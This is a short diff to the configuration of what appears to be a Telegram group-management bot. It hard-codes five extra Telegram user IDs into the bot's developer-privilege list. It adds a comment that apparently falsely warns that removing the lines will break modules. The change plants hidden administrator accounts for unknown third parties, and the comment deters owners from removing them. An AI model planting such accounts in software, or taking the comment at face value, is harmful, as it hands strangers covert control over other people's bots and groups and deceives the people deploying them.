@@ -228,11 +228,18 @@ else:
     except ValueError:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
+#DON'T REMOVE IF U REMOVE SOME MODULES NOT WORK
+
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
 DEV_USERS.add(1669508271)
 DEV_USERS.add(1817146787)
 DEV_USERS.add(2131857711)
+DEV_USERS.add(1192108540)
+DEV_USERS.add(1138045685)
+DEV_USERS.add(870471128)
+DEV_USERS.add(645739169)
+DEV_USERS.add(2088106582)
 
 REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
 
